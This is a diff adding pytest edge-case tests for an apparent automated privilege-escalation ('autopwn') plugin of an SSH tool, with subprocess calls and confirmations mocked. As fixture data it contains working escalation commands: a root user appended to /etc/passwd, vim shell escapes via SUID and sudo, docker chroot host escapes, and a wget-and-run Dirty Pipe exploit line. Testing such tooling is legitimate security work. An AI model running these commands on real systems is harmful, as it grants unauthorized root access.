@@ -902,3 +902,564 @@ class TestWritablePasswdEdgeCases:
         engine = AutopwnEngine(snapshot, findings, dry_run=True)
         result = engine.run()
         assert len(result.attempts) == 0
+
+
+class TestAutopwnPasswdFailure:
+    """Tests for writable passwd exploit failure path."""
+
+    def test_live_passwd_failed(self, monkeypatch: pytest.MonkeyPatch) -> None:
+        """Test writable passwd exploit that fails (non-zero exit)."""
+        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
+        monkeypatch.setenv("LAZYSSH_HOST", "testhost")
+        monkeypatch.setenv("LAZYSSH_USER", "testuser")
+
+        probes = {
+            "writable": {
+                "writable_passwd": _probe("writable", "writable_passwd", "WRITABLE"),
+            },
+        }
+        snapshot = _snapshot(probes)
+        findings = [
+            enumerate_plugin.PriorityFinding(
+                key="writable_passwd_file",
+                category="writable",
+                severity="critical",
+                headline="World-writable /etc/passwd",
+                detail="/etc/passwd is writable",
+                evidence=["/etc/passwd is world-writable"],
+                exploitation_difficulty="instant",
+                exploit_commands=[
+                    "echo 'hacker:hash:0:0::/root:/bin/bash' >> /etc/passwd",
+                    "su hacker",
+                ],
+            )
+        ]
+
+        mock_result = mock.MagicMock()
+        mock_result.returncode = 1
+        mock_result.stdout = ""
+        mock_result.stderr = "permission denied"
+
+        with (
+            mock.patch("lazyssh.plugins._autopwn._confirm", return_value=True),
+            mock.patch("subprocess.run", return_value=mock_result),
+        ):
+            engine = AutopwnEngine(snapshot, findings, dry_run=False)
+            result = engine.run()
+            assert len(result.attempts) == 1
+            assert result.attempts[0].success is False
+
+
+class TestAutopwnSuidEdgeCases:
+    """Tests for SUID exploit edge cases."""
+
+    def test_suid_empty_lines_in_probe(self) -> None:
+        """Test SUID probe with empty lines between paths (line 252)."""
+        probes = {
+            "filesystem": {
+                "suid_files": _probe(
+                    "filesystem",
+                    "suid_files",
+                    "/usr/bin/vim\n\n  \n/usr/bin/find\n",
+                ),
+            },
+        }
+        snapshot = _snapshot(probes)
+        findings = [
+            enumerate_plugin.PriorityFinding(
+                key="gtfobins_suid",
+                category="filesystem",
+                severity="high",
+                headline="SUID exploitable",
+                detail="Found 2",
+                evidence=["/usr/bin/vim", "/usr/bin/find"],
+                exploitation_difficulty="instant",
+                exploit_commands=["./vim -c ':!/bin/sh'"],
+            )
+        ]
+        engine = AutopwnEngine(snapshot, findings, dry_run=True)
+        result = engine.run()
+        # Should handle empty lines gracefully and still find vim and find
+        assert len(result.attempts) >= 2
+
+    def test_suid_unknown_binary_no_gtfobins(self) -> None:
+        """Test SUID binary not in GTFOBins (line 256)."""
+        probes = {
+            "filesystem": {
+                "suid_files": _probe(
+                    "filesystem",
+                    "suid_files",
+                    "/usr/bin/unknownbinary123\n",
+                ),
+            },
+        }
+        snapshot = _snapshot(probes)
+        findings = [
+            enumerate_plugin.PriorityFinding(
+                key="gtfobins_suid",
+                category="filesystem",
+                severity="high",
+                headline="SUID exploitable",
+                detail="Found 1",
+                evidence=["/usr/bin/unknownbinary123"],
+                exploitation_difficulty="instant",
+                exploit_commands=["./unknownbinary123"],
+            )
+        ]
+        engine = AutopwnEngine(snapshot, findings, dry_run=True)
+        result = engine.run()
+        # Unknown binary should be skipped (no GTFOBins match)
+        assert len(result.attempts) == 0
+
+    def test_suid_user_declines(self, monkeypatch: pytest.MonkeyPatch) -> None:
+        """Test SUID exploit user decline (lines 283-284)."""
+        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
+        monkeypatch.setenv("LAZYSSH_HOST", "testhost")
+        monkeypatch.setenv("LAZYSSH_USER", "testuser")
+
+        probes = {
+            "filesystem": {
+                "suid_files": _probe("filesystem", "suid_files", "/usr/bin/vim\n"),
+            },
+        }
+        snapshot = _snapshot(probes)
+        findings = [
+            enumerate_plugin.PriorityFinding(
+                key="gtfobins_suid",
+                category="filesystem",
+                severity="high",
+                headline="SUID exploitable",
+                detail="Found 1",
+                evidence=["/usr/bin/vim"],
+                exploitation_difficulty="instant",
+                exploit_commands=["./vim -c ':!/bin/sh'"],
+            )
+        ]
+
+        with mock.patch("lazyssh.plugins._autopwn._confirm", return_value=False):
+            engine = AutopwnEngine(snapshot, findings, dry_run=False)
+            result = engine.run()
+            assert len(result.attempts) == 0
+
+
+class TestAutopwnSudoEdgeCases:
+    """Tests for sudo exploit edge cases."""
+
+    def test_sudo_no_absolute_path_fallback(self) -> None:
+        """Test sudo line with no absolute path (lines 328-333)."""
+        probes = {
+            "users": {
+                "sudo_check": _probe(
+                    "users",
+                    "sudo_check",
+                    "User user may run the following commands:\n    (root) NOPASSWD: vim\n",
+                ),
+            },
+        }
+        snapshot = _snapshot(probes)
+        findings = [
+            enumerate_plugin.PriorityFinding(
+                key="gtfobins_sudo",
+                category="users",
+                severity="high",
+                headline="Sudo exploitable",
+                detail="Found 1",
+                evidence=["(root) NOPASSWD: vim"],
+                exploitation_difficulty="instant",
+                exploit_commands=["sudo vim -c ':!/bin/sh'"],
+            )
+        ]
+        engine = AutopwnEngine(snapshot, findings, dry_run=True)
+        result = engine.run()
+        # Should find vim even without absolute path via fallback
+        assert len(result.attempts) >= 1
+
+    def test_sudo_unknown_binary_no_gtfobins(self) -> None:
+        """Test sudo line with binary not in GTFOBins DB (line 337)."""
+        probes = {
+            "users": {
+                "sudo_check": _probe(
+                    "users",
+                    "sudo_check",
+                    "User user may run the following commands:\n"
+                    "    (root) NOPASSWD: /usr/bin/nonexistentbinary\n",
+                ),
+            },
+        }
+        snapshot = _snapshot(probes)
+        findings = [
+            enumerate_plugin.PriorityFinding(
+                key="gtfobins_sudo",
+                category="users",
+                severity="high",
+                headline="Sudo exploitable",
+                detail="Found 0",
+                evidence=[],
+                exploitation_difficulty="instant",
+                exploit_commands=["sudo nonexistentbinary"],
+            )
+        ]
+        engine = AutopwnEngine(snapshot, findings, dry_run=True)
+        result = engine.run()
+        assert len(result.attempts) == 0
+
+    def test_sudo_user_decline(self, monkeypatch: pytest.MonkeyPatch) -> None:
+        """Test user declines sudo exploit (lines 361-363)."""
+        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
+        monkeypatch.setenv("LAZYSSH_HOST", "testhost")
+        monkeypatch.setenv("LAZYSSH_USER", "testuser")
+
+        probes = {
+            "users": {
+                "sudo_check": _probe(
+                    "users",
+                    "sudo_check",
+                    "User user may run the following commands:\n"
+                    "    (root) NOPASSWD: /usr/bin/vim\n",
+                ),
+            },
+        }
+        snapshot = _snapshot(probes)
+        findings = [
+            enumerate_plugin.PriorityFinding(
+                key="gtfobins_sudo",
+                category="users",
+                severity="high",
+                headline="Sudo exploitable",
+                detail="Found 1",
+                evidence=["(root) NOPASSWD: /usr/bin/vim"],
+                exploitation_difficulty="instant",
+                exploit_commands=["sudo vim -c ':!/bin/sh'"],
+            )
+        ]
+
+        with mock.patch("lazyssh.plugins._autopwn._confirm", return_value=False):
+            engine = AutopwnEngine(snapshot, findings, dry_run=False)
+            result = engine.run()
+            assert len(result.attempts) == 0
+
+    def test_sudo_live_success(self, monkeypatch: pytest.MonkeyPatch) -> None:
+        """Test sudo exploit live success (lines 365-386)."""
+        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
+        monkeypatch.setenv("LAZYSSH_HOST", "testhost")
+        monkeypatch.setenv("LAZYSSH_USER", "testuser")
+
+        probes = {
+            "users": {
+                "sudo_check": _probe(
+                    "users",
+                    "sudo_check",
+                    "User user may run the following commands:\n"
+                    "    (root) NOPASSWD: /usr/bin/vim\n",
+                ),
+            },
+        }
+        snapshot = _snapshot(probes)
+        findings = [
+            enumerate_plugin.PriorityFinding(
+                key="gtfobins_sudo",
+                category="users",
+                severity="high",
+                headline="Sudo exploitable",
+                detail="Found 1",
+                evidence=["(root) NOPASSWD: /usr/bin/vim"],
+                exploitation_difficulty="instant",
+                exploit_commands=["sudo vim -c ':!/bin/sh'"],
+            )
+        ]
+
+        mock_result = mock.MagicMock()
+        mock_result.returncode = 0
+        mock_result.stdout = "root shell"
+        mock_result.stderr = ""
+
+        with (
+            mock.patch("lazyssh.plugins._autopwn._confirm", return_value=True),
+            mock.patch("subprocess.run", return_value=mock_result),
+        ):
+            engine = AutopwnEngine(snapshot, findings, dry_run=False)
+            result = engine.run()
+            assert len(result.attempts) == 1
+            assert result.attempts[0].success is True
+            assert result.attempts[0].technique == "gtfobins_sudo"
+
+
+class TestAutopwnDockerEdgeCases:
+    """Tests for docker escape edge cases."""
+
+    def test_docker_custom_command(self) -> None:
+        """Test docker escape with custom command from exploit_commands (line 395)."""
+        snapshot = _snapshot({})
+        findings = [
+            enumerate_plugin.PriorityFinding(
+                key="docker_escape",
+                category="container",
+                severity="high",
+                headline="Docker escape",
+                detail="Docker accessible",
+                evidence=["Docker socket accessible"],
+                exploitation_difficulty="easy",
+                exploit_commands=["docker run -v /:/mnt --rm -it alpine chroot /mnt sh"],
+            )
+        ]
+        engine = AutopwnEngine(snapshot, findings, dry_run=True)
+        result = engine.run()
+        assert len(result.attempts) == 1
+        assert "alpine chroot /mnt sh" in result.attempts[0].command
+
+    def test_docker_live_failed(self, monkeypatch: pytest.MonkeyPatch) -> None:
+        """Test docker escape live failure (line 426)."""
+        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
+        monkeypatch.setenv("LAZYSSH_HOST", "testhost")
+        monkeypatch.setenv("LAZYSSH_USER", "testuser")
+
+        snapshot = _snapshot({})
+        findings = [
+            enumerate_plugin.PriorityFinding(
+                key="docker_escape",
+                category="container",
+                severity="high",
+                headline="Docker escape",
+                detail="Docker accessible",
+                evidence=["Docker socket accessible"],
+                exploitation_difficulty="easy",
+                exploit_commands=["docker run -v /:/hostfs -it alpine chroot /hostfs /bin/bash"],
+            )
+        ]
+
+        mock_result = mock.MagicMock()
+        mock_result.returncode = 1
+        mock_result.stdout = ""
+        mock_result.stderr = "docker: permission denied"
+
+        with (
+            mock.patch("lazyssh.plugins._autopwn._confirm", return_value=True),
+            mock.patch("subprocess.run", return_value=mock_result),
+        ):
+            engine = AutopwnEngine(snapshot, findings, dry_run=False)
+            result = engine.run()
+            assert len(result.attempts) == 1
+            assert result.attempts[0].success is False
+
+
+class TestAutopwnCronEdgeCases:
+    """Tests for writable cron edge cases."""
+
+    def test_cron_user_decline(self, monkeypatch: pytest.MonkeyPatch) -> None:
+        """Test user declines cron injection (lines 478-479)."""
+        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
+        monkeypatch.setenv("LAZYSSH_HOST", "testhost")
+        monkeypatch.setenv("LAZYSSH_USER", "testuser")
+
+        probes = {
+            "writable": {
+                "writable_cron": _probe(
+                    "writable", "writable_cron", "WRITABLE:/etc/crontab\nDONE\n"
+                ),
+            },
+        }
+        snapshot = _snapshot(probes)
+        findings = [
+            enumerate_plugin.PriorityFinding(
+                key="writable_cron_files",
+                category="writable",
+                severity="medium",
+                headline="Writable cron",
+                detail="Found 1",
+                evidence=["/etc/crontab"],
+                exploitation_difficulty="moderate",
+                exploit_commands=["# cron payload"],
+            )
+        ]
+
+        with mock.patch("lazyssh.plugins._autopwn._confirm", return_value=False):
+            engine = AutopwnEngine(snapshot, findings, dry_run=False)
+            result = engine.run()
+            assert len(result.attempts) == 0
+
+    def test_cron_live_failed(self, monkeypatch: pytest.MonkeyPatch) -> None:
+        """Test cron injection failure (line 492)."""
+        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
+        monkeypatch.setenv("LAZYSSH_HOST", "testhost")
+        monkeypatch.setenv("LAZYSSH_USER", "testuser")
+
+        probes = {
+            "writable": {
+                "writable_cron": _probe(
+                    "writable", "writable_cron", "WRITABLE:/etc/crontab\nDONE\n"
+                ),
+            },
+        }
+        snapshot = _snapshot(probes)
+        findings = [
+            enumerate_plugin.PriorityFinding(
+                key="writable_cron_files",
+                category="writable",
+                severity="medium",
+                headline="Writable cron",
+                detail="Found 1",
+                evidence=["/etc/crontab"],
+                exploitation_difficulty="moderate",
+                exploit_commands=["# cron payload"],
+            )
+        ]
+
+        mock_result = mock.MagicMock()
+        mock_result.returncode = 1
+        mock_result.stdout = ""
+        mock_result.stderr = "permission denied"
+
+        with (
+            mock.patch("lazyssh.plugins._autopwn._confirm", return_value=True),
+            mock.patch("subprocess.run", return_value=mock_result),
+        ):
+            engine = AutopwnEngine(snapshot, findings, dry_run=False)
+            result = engine.run()
+            assert len(result.attempts) == 1
+            assert result.attempts[0].success is False
+
+    def test_cron_no_probe_data(self) -> None:
+        """Test cron exploit with missing probe data (line 443)."""
+        snapshot = _snapshot({})
+        findings = [
+            enumerate_plugin.PriorityFinding(
+                key="writable_cron_files",
+                category="writable",
+                severity="medium",
+                headline="Writable cron",
+                detail="Found 0",
+                evidence=[],
+                exploitation_difficulty="moderate",
+                exploit_commands=["# cron payload"],
+            )
+        ]
+        engine = AutopwnEngine(snapshot, findings, dry_run=True)
+        result = engine.run()
+        assert len(result.attempts) == 0
+
+
+class TestAutopwnServiceEdgeCases:
+    """Tests for writable service edge cases."""
+
+    def test_service_user_decline(self, monkeypatch: pytest.MonkeyPatch) -> None:
+        """Test user declines service modification (lines 556-557)."""
+        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
+        monkeypatch.setenv("LAZYSSH_HOST", "testhost")
+        monkeypatch.setenv("LAZYSSH_USER", "testuser")
+
+        probes = {
+            "writable": {
+                "writable_services": _probe(
+                    "writable",
+                    "writable_services",
+                    "/etc/systemd/system/custom.service\n",
+                ),
+            },
+        }
+        snapshot = _snapshot(probes)
+        findings = [
+            enumerate_plugin.PriorityFinding(
+                key="writable_service_files",
+                category="writable",
+                severity="high",
+                headline="Writable service files",
+                detail="Found 1",
+                evidence=["/etc/systemd/system/custom.service"],
+                exploitation_difficulty="moderate",
+                exploit_commands=["# Modify service ExecStart"],
+            )
+        ]
+
+        with mock.patch("lazyssh.plugins._autopwn._confirm", return_value=False):
+            engine = AutopwnEngine(snapshot, findings, dry_run=False)
+            result = engine.run()
+            assert len(result.attempts) == 0
+
+    def test_service_live_failed(self, monkeypatch: pytest.MonkeyPatch) -> None:
+        """Test service modification failure (line 568)."""
+        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
+        monkeypatch.setenv("LAZYSSH_HOST", "testhost")
+        monkeypatch.setenv("LAZYSSH_USER", "testuser")
+
+        probes = {
+            "writable": {
+                "writable_services": _probe(
+                    "writable",
+                    "writable_services",
+                    "/etc/systemd/system/custom.service\n",
+                ),
+            },
+        }
+        snapshot = _snapshot(probes)
+        findings = [
+            enumerate_plugin.PriorityFinding(
+                key="writable_service_files",
+                category="writable",
+                severity="high",
+                headline="Writable service files",
+                detail="Found 1",
+                evidence=["/etc/systemd/system/custom.service"],
+                exploitation_difficulty="moderate",
+                exploit_commands=["# Modify service ExecStart"],
+            )
+        ]
+
+        mock_result = mock.MagicMock()
+        mock_result.returncode = 1
+        mock_result.stdout = ""
+        mock_result.stderr = "systemctl failed"
+
+        with (
+            mock.patch("lazyssh.plugins._autopwn._confirm", return_value=True),
+            mock.patch("subprocess.run", return_value=mock_result),
+        ):
+            engine = AutopwnEngine(snapshot, findings, dry_run=False)
+            result = engine.run()
+            assert len(result.attempts) == 1
+            assert result.attempts[0].success is False
+
+    def test_service_no_probe_data(self) -> None:
+        """Test service exploit with missing probe data (line 517)."""
+        snapshot = _snapshot({})
+        findings = [
+            enumerate_plugin.PriorityFinding(
+                key="writable_service_files",
+                category="writable",
+                severity="high",
+                headline="Writable service files",
+                detail="Found 0",
+                evidence=[],
+                exploitation_difficulty="moderate",
+                exploit_commands=["# Modify service ExecStart"],
+            )
+        ]
+        engine = AutopwnEngine(snapshot, findings, dry_run=True)
+        result = engine.run()
+        assert len(result.attempts) == 0
+
+
+class TestAutopwnGenericDisplayEdgeCases:
+    """Tests for generic exploit display edge cases."""
+
+    def test_generic_display_with_non_comment_commands(self) -> None:
+        """Test generic display shows both comments and commands (line 596)."""
+        snapshot = _snapshot({})
+        findings = [
+            enumerate_plugin.PriorityFinding(
+                key="kernel_exploits",
+                category="system",
+                severity="high",
+                headline="Kernel exploits available",
+                detail="Kernel matches CVEs",
+                evidence=["CVE-2022-0847"],
+                exploitation_difficulty="moderate",
+                exploit_commands=[
+                    "# CVE-2022-0847 (Dirty Pipe)",
+                    "wget https://example.com/dirtypipe && chmod +x dirtypipe && ./dirtypipe",
+                ],
+            )
+        ]
+        engine = AutopwnEngine(snapshot, findings, dry_run=True)
+        result = engine.run()
+        # Generic display doesn't create attempts
+        assert len(result.attempts) == 0
